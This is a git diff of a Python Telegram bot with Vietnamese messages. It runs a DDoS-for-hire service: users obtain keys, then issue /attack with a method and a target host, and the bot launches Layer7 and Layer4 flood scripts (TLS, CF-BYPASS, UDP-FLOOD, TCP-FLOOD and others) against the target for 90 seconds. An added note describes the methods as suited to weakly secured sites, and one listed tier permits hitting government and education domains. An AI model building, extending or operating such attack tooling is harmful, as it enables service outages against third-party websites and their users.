@@ -59,11 +59,11 @@ def save_user_to_database(connection, user_id, expiration_time):
 def add_user(message):
     admin_id = message.from_user.id
     if admin_id != ADMIN_ID:
-        bot.reply_to(message, 'Chi Dành Cho Admin')
+        bot.reply_to(message, '‼️ Cảnh Cáo ‼️\n📢 Chỉ Dành Cho Admin\nVui Lòng Không Lặp Lại Hành Vi Này Nếu Không Bạn Sẽ Bị Cấm Vĩnh Viễn 📢')
         return
 
     if len(message.text.split()) == 1:
-        bot.reply_to(message, 'Nhập Đúng Định Dạng /add + [id]')
+        bot.reply_to(message, '‼️Vui Lòng Nhập Đúng Định Dạng⁉️\n/add + [id]')
         return
 
     user_id = int(message.text.split()[1])
@@ -73,7 +73,7 @@ def add_user(message):
     save_user_to_database(connection, user_id, expiration_time)
     connection.close()
 
-    bot.reply_to(message, f'Đã Thêm Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh 30 Ngày')
+    bot.reply_to(message, f'✅ Đã Thêm Người Dùng Có ID Là: {user_id} Được Sử Dụng Lệnh Trong 30 Ngày ✅')
 
 
 load_users_from_database()
@@ -85,7 +85,7 @@ def send_welcome(message):
 
 @bot.message_handler(commands=['getkey'])
 def laykey(message):
-    bot.reply_to(message, text='Vui Lòng Chờ...')
+    bot.reply_to(message, text='⏳ Vui Lòng Chờ...⏳')
 
     with open('key.txt', 'a') as f:
         f.close()
@@ -102,22 +102,22 @@ def laykey(message):
         if 'shortenedUrl' in response_json:
             url_key = response_json['shortenedUrl']
         else:
-            url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
+            url_key = "‼️Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh‼️\n/getkey"
     except requests.exceptions.RequestException as e:
-        url_key = "FLấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
+        url_key = "‼️Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh‼️\n/getkey"
     
     text = f'''
-- Cảm Ơn Bạn Đã Getkey -
-- Link Lấy Key Hôm Nay Là: {url_key}
-- Nhập Key Bằng Lệnh /key + [key] -
- [Lưu ý: mỗi key chỉ có 1 người dùng]
+😙 - Cảm Ơn Bạn Đã Getkey - 😙
+🌐 - Link Lấy Key Hôm Nay Là: {url_key} - 🌐
+✏️ - Nhập Key Bằng Lệnh /key + [key] - ✏️
+🔔 [Lưu ý: mỗi key chỉ có 1 người dùng] 🔔
     '''
     bot.reply_to(message, text)
 
 @bot.message_handler(commands=['key'])
 def key(message):
     if len(message.text.split()) == 1:
-        bot.reply_to(message, 'Vui Lòng Nhập Key\nVí Dụ /key admin\nSử Dụng Lệnh /getkey Để Lấy Key')
+        bot.reply_to(message, '‼️ Vui Lòng Nhập Key ‼️\n😐 Ví Dụ /key admin 😐\n🔔Sử Dụng Lệnh /getkey Để Lấy Key🔔')
         return
 
     user_id = message.from_user.id
@@ -129,9 +129,9 @@ def key(message):
     expected_key = str(hash_object.hexdigest())
     if key == expected_key:
         allowed_users.append(user_id)
-        bot.reply_to(message, 'Nhập Key Thành Công')
+        bot.reply_to(message, '🥳Nhập Key Thành Công🥳')
     else:
-        bot.reply_to(message, 'Key Sai Hoặc Hết Hạn\nKhông Sử Dụng Key Của Người Khác!')
+        bot.reply_to(message, '‼️Key Sai Hoặc Hết Hạn‼️\n‼️Không Sử Dụng Key Của Người Khác!‼️')
 
 @bot.message_handler(commands=['help'])
 def help(message):
@@ -220,13 +220,16 @@ def methods(message):
 🚀 Layer7 
 [ Không Gov, Edu ]
 TLS
+FLOOD
 DESTROY
+GOD
 CF-BYPASS
 [ Được Pem Gov, Edu]
 GOD 
 🚀 Layer4
 TCP-FLOOD
 UDP-FLOOD
+❗Lưu ý đây chỉ là những method ddos tầm trung và để ddos những web bảo mật yếu nếu muốn update method khỏe hơn thì hãy góp ý thêm cho admin để admin update thêm nhé❗
 '''
     bot.reply_to(message, help_text)
 
@@ -244,7 +247,7 @@ def run_attack(command, duration, message):
             time_passed = time.time() - start_time
             if time_passed >= 90:
                 cmd_process.terminate()
-                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
+                bot.reply_to(message, "📢 Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng📢")
                 return
         # Check if the attack duration has been reached
         if time.time() - start_time >= duration:
@@ -256,15 +259,15 @@ def run_attack(command, duration, message):
 def attack_command(message):
     user_id = message.from_user.id
     if not is_bot_active:
-        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
+        bot.reply_to(message, '⏰ Bot hiện đang bảo trì. Vui lòng chờ đến khi bot hoạt động trở lại.⏰')
         return
     
     if user_id not in allowed_users:
-        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
+        bot.reply_to(message, text='‼️ Vui Lòng Nhập Key ‼️\n😐 Ví Dụ /key admin 😐\n🔔Sử Dụng Lệnh /getkey Để Lấy Key🔔')
         return
 
     if len(message.text.split()) < 3:
-        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /attack + [method] + [host]')
+        bot.reply_to(message, '‼️Vui lòng nhập đúng cú pháp.\nVí dụ: /attack + [method] + [host]‼️')
         return
 
     username = message.from_user.username
@@ -272,7 +275,7 @@ def attack_command(message):
     current_time = time.time()
     if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
         remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
-        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
+        bot.reply_to(message, f"⏳@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh⏳\n/attack.")
         return
     
     args = message.text.split()
@@ -280,7 +283,7 @@ def attack_command(message):
     host = args[2]
 
     if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
-        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
+        bot.reply_to(message, f'‼️Vui lòng nhập cả port.‼️\n😗 Ví dụ: /attack {method} {host} [port] 😗')
         return
 
     if method in ['UDP-FLOOD', 'TCP-FLOOD']:
@@ -292,7 +295,7 @@ def attack_command(message):
     if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
         for blocked_domain in blocked_domains:
             if blocked_domain in host:
-                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
+                bot.reply_to(message, f"‼️Không được phép tấn công trang web có tên miền {blocked_domain}‼️")
                 return
 
     if method in ['FLOOD',' TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
@@ -316,13 +319,13 @@ def attack_command(message):
             duration = 90
         elif method == 'UDP-FLOOD':
             if not port.isdigit():
-                bot.reply_to(message, 'Port phải là một số nguyên dương.')
+                bot.reply_to(message, '❗Port phải là một số nguyên dương.❗')
                 return
             command = ["python", "udp.py", host, port, "90", "64", "10"]
             duration = 90
         elif method == 'TCP-FLOOD':
             if not port.isdigit():
-                bot.reply_to(message, 'Port phải là một số nguyên dương.')
+                bot.reply_to(message, '❗Port phải là một số nguyên dương.❗')
                 return
             command = ["python", "tcp.py", host, port, "90", "64", "10"]
             duration = 90
@@ -333,13 +336,13 @@ def attack_command(message):
         attack_thread.start()
         bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Check Host: https://check-host.net/check-http?host={host} \n┣➤ Check TCP:  https://check-host.net/check-tcp?host={host}\n┗━━━━━━━━━━━━━━➤')
     else:
-        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')
+        bot.reply_to(message, '‼️Phương thức tấn công không hợp lệ. Sử dụng lệnh\n/methods để xem phương thức tấn công‼️')
 
 @bot.message_handler(commands=['cpu'])
 def check_cpu(message):
     user_id = message.from_user.id
     if user_id != ADMIN_ID:
-        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
+        bot.reply_to(message, '‼️Bạn không có quyền sử dụng lệnh này.‼️')
         return
 
     cpu_usage = psutil.cpu_percent(interval=1)
@@ -351,23 +354,23 @@ def check_cpu(message):
 def turn_off(message):
     user_id = message.from_user.id
     if user_id != ADMIN_ID:
-        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
+        bot.reply_to(message, '‼️Bạn không có quyền sử dụng lệnh này.‼️')
         return
 
     global is_bot_active
     is_bot_active = False
-    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác.')
+    bot.reply_to(message, '📢 Bot Đang Bảo Trì, Vui Lòng Đợi Đến Khi Bot Hoạt Động Trở Lại 📢')
 
 @bot.message_handler(commands=['on'])
 def turn_on(message):
     user_id = message.from_user.id
     if user_id != ADMIN_ID:
-        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
+        bot.reply_to(message, '‼️Bạn không có quyền sử dụng lệnh này.‼️')
         return
 
     global is_bot_active
     is_bot_active = True
-    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')
+    bot.reply_to(message, '📢 Bot Đã Hoạt Động Trở Lại, Các Bạn Đã Có Thể Sử Dụng Bot Như Bình Thường 📢\n😐 Nếu Có Bất Kỳ Lỗi Nào Sau Bảo Trì Vui Lòng Liên Hệ ADMIN Bằng Cách Chat /admin Nhé 😐')
 
 is_bot_active = True
 
@@ -390,11 +393,182 @@ def show_uptime(message):
     minutes = int((uptime % 3600) // 60)
     seconds = int(uptime % 60)
     uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
-    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')
+    bot.reply_to(message, f'⏰ Bot Đã Hoạt Động Được: {uptime_str} ⏰')
+    
+def write_banned_users(users):
+    with open('ban.txt', 'w') as ban_file:
+        for user in users:
+            ban_file.write(f"{user}\n")
 
+def write_muted_users(users):
+    with open('mute.txt', 'w') as mute_file:
+        for chat_id, muted_user_list in users.items():
+            for username, mute_time in muted_user_list.items():
+                mute_file.write(f"{chat_id},{username},{mute_time}\n")
+
+def read_banned_users():
+    banned_users = []
+    try:
+        with open('ban.txt', 'r') as ban_file:
+            banned_users = [line.strip() for line in ban_file.readlines()]
+    except FileNotFoundError:
+        pass
+    return banned_users
+
+def read_muted_users():
+    muted_users = {}
+    try:
+        with open('mute.txt', 'r') as mute_file:
+            lines = mute_file.readlines()
+            for line in lines:
+                chat_id, username, mute_time = line.strip().split(',')
+                if chat_id not in muted_users:
+                    muted_users[chat_id] = {}
+                muted_users[chat_id][username] = int(mute_time)
+    except FileNotFoundError:
+        pass
+    return muted_users
+
+banned_users = read_banned_users()
+muted_users = read_muted_users()
+
+@bot.message_handler(commands=['ban'])
+def ban_user(message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id  # Lấy ID của người gửi tin nhắn
+
+    if user_id != ADMIN_ID:
+        bot.reply_to(message, "‼️ Bạn không có quyền thực hiện lệnh này. ‼️")
+        return
+
+    if len(message.text.split()) < 2:
+        bot.reply_to(message, "✏️ Vui lòng cung cấp tên người dùng để cấm. ✏️\n 🔔 Ví Dụ: /ban @admin 🔔")
+        return
+
+    username_to_ban = message.text.split()[1]
+    if username_to_ban.startswith('@'):
+        username_to_ban = username_to_ban[1:]
+
+    if username_to_ban in banned_users:
+        bot.reply_to(message, f"🚫 Người dùng @{username_to_ban} đã bị cấm 🚫.")
+    else:
+        banned_users.append(username_to_ban)
+        write_banned_users(banned_users)
+        bot.reply_to(message, f"✅ Đã cấm người dùng @{username_to_ban} khỏi hệ thống ✅.")
+
+@bot.message_handler(commands=['unban'])
+def unban_user(message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id  # Lấy ID của người gửi tin nhắn
+
+    if user_id != ADMIN_ID:
+        bot.reply_to(message, "‼️ Bạn không có quyền thực hiện lệnh này. ‼️")
+        return
+
+    if len(message.text.split()) < 2:
+        bot.reply_to(message, "✏️ Vui lòng cung cấp tên người dùng để gỡ cấm. ✏️\n 🔔 Ví Dụ: /unban @admin 🔔")
+        return
+
+    username_to_unban = message.text.split()[1]
+    if username_to_unban.startswith('@'):
+        username_to_unban = username_to_unban[1:]
+
+    if username_to_unban in banned_users:
+        banned_users.remove(username_to_unban)
+        write_banned_users(banned_users)
+        bot.reply_to(message, f"✅ Đã gỡ cấm người dùng @{username_to_unban} khỏi hệ thống ✅.")
+    else:
+        bot.reply_to(message, f"‼️ Người dùng @{username_to_unban} không nằm trong danh sách bị cấm‼️.")
+
+@bot.message_handler(commands=['muted'])
+def mute_user(message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id  # Lấy ID của người gửi tin nhắn
+
+    if user_id != ADMIN_ID:
+        bot.reply_to(message, "🔊 Bạn không có quyền thực hiện lệnh này. 🔊")
+        return
+
+    args = message.text.split()
+    if len(args) != 3:
+        bot.reply_to(message, "📝 Vui lòng cung cấp tên người dùng và thời gian cấm (số giây). 📝\n🔔 Ví Dụ: /muted @admin 60 🔔")
+        return
+
+    username_to_mute = args[1]
+    if username_to_mute.startswith('@'):
+        username_to_mute = username_to_mute[1:]
+
+    try:
+        mute_time = int(args[2])
+    except ValueError:
+        bot.reply_to(message, "‼️ Thời gian cấm không hợp lệ. ‼️")
+        return
+
+    if chat_id not in muted_users:
+        muted_users[chat_id] = {}
+    muted_users[chat_id][username_to_mute] = int(time.time()) + mute_time
+    write_muted_users(muted_users)
+    bot.reply_to(message, f"✅ Đã cấm người dùng @{username_to_mute} chat với bot trong {mute_time} giây ✅.")
+
+@bot.message_handler(commands=['unmuted'])
+def unmute_user(message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id  # Lấy ID của người gửi tin nhắn
+
+    if user_id != ADMIN_ID:
+        bot.reply_to(message, "‼️ Bạn không có quyền thực hiện lệnh này. ‼️")
+        return
+
+    args = message.text.split()
+    if len(args) != 2:
+        bot.reply_to(message, "📝 Vui lòng cung cấp tên người dùng để gỡ cấm. 📝\n 🔔 Ví Dụ: /unmuted @admin 🔔")
+        return
+
+    username_to_unmute = args[1]
+    if username_to_unmute.startswith('@'):
+        username_to_unmute = username_to_unmute[1:]
+
+    if chat_id in muted_users and username_to_unmute in muted_users[chat_id]:
+        del muted_users[chat_id][username_to_unmute]
+        write_muted_users(muted_users)
+        bot.reply_to(message, f"✅ Đã gỡ cấm chat cho người dùng @{username_to_unmute} ✅.")
+    else:
+        bot.reply_to(message, f"❌ Người dùng @{username_to_unmute} không bị cấm chat. ❌.")
+      
+def is_user_banned(username):
+    return username in banned_users
+
+def is_user_muted(chat_id, username):
+    if chat_id in muted_users and username in muted_users[chat_id]:
+        return muted_users[chat_id][username] > int(time.time())
+    return False
+
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    chat_id = message.chat.id
+    username = message.from_user.username
+
+    if is_user_banned(username) or is_user_muted(chat_id, username):
+        bot.reply_to(message, "🚫 Bạn đang bị cấm chat với bot vĩnh viễn hay liên hệ admin bằng cách chat /admin để biết thêm thông tin chi tiết. 🚫")
+        return
+
+    if message.text.startswith('/') and not message.text.startswith('/start'):
+        invalid_command(message)
+
+# Add this check to prevent banned/muted users from using commands
+@bot.message_handler(func=lambda message: message.chat.id not in banned_users and not is_user_muted(message.chat.id, message.from_user.username))
+def process_commands(message):
+    if is_user_banned(message.from_user.username):
+        bot.reply_to(message, "🚫 Bạn đang bị cấm chat với bot. 🚫")
+        return
+    if is_user_muted(message.chat.id, message.from_user.username):
+        mute_time = muted_users[message.chat.id][message.from_user.username] - int(time.time())
+        bot.reply_to(message, f"🔇 Bạn đang bị cấm chat với bot. Thời gian còn lại: {mute_time} giây. 🔇")
+        return
+
+    bot.process_new_messages([message])
 
 @bot.message_handler(func=lambda message: message.text.startswith('/'))
 def invalid_command(message):
-    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')
-
+    bot.reply_to(message, '‼️Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.‼️')
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
